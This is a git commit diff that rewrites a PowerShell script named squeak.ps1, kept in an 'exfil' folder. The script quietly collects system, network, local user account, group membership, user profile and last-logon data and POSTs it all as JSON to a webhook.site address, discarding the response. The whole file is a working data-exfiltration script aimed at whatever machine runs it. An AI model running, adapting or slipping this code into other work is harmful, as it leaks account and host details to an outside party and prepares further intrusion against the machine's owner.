8446c23157a7d0c1add702a0c7e37b1d87f1f9f0
Andrei Vladescu <52881237+AndreiVladescu@users.noreply.github.com>
2024-09-18 08:49:23 +0300

    Update squeak.ps1

--- exfil/squeak.ps1
+++ exfil/squeak.ps1
@@ -1,1 +1,35 @@
-$webhookUrl = 'https://webhook.site/0a189af6-6354-438f-9720-46b8aa86e633'; $computerInfo = Get-ComputerInfo | ConvertTo-Json; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $computerInfo -ContentType 'application/json'
+
+# Replace the webhook url
+$webhookUrl = 'https://webhook.site/7c90c9ef-a00f-4256-be00-51bf4287b84e'
+
+# Collect system info into variables
+$computerInfo = Get-ComputerInfo
+$processorInfo = Get-WmiObject -Class Win32_Processor
+$memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory
+$diskInfo = Get-WmiObject -Class Win32_DiskDrive
+$networkInfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
+$userAccounts = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }
+$currentUser = Get-WmiObject -Class Win32_ComputerSystem | Select-Object Username
+$localUsers = Get-LocalUser
+$userProfiles = Get-WmiObject -Class Win32_UserProfile
+$groupMemberships = Get-LocalGroup | ForEach-Object { Get-LocalGroupMember -Group $_.Name }
+$lastLogon = Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object Name, LastLogon
+
+$dataObject = [PSCustomObject]@{
+    ComputerInfo    = $computerInfo
+    ProcessorInfo   = $processorInfo
+    MemoryInfo      = $memoryInfo
+    DiskInfo        = $diskInfo
+    NetworkInfo     = $networkInfo
+    UserAccounts    = $userAccounts
+    CurrentUser     = $currentUser
+    LocalUsers      = $localUsers
+    UserProfiles    = $userProfiles
+    GroupMemberships = $groupMemberships
+    LastLogon       = $lastLogon
+}
+
+$jsonData = $dataObject | ConvertTo-Json -Depth 3
+
+# Send it to webhook URL
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json' | Out-Null
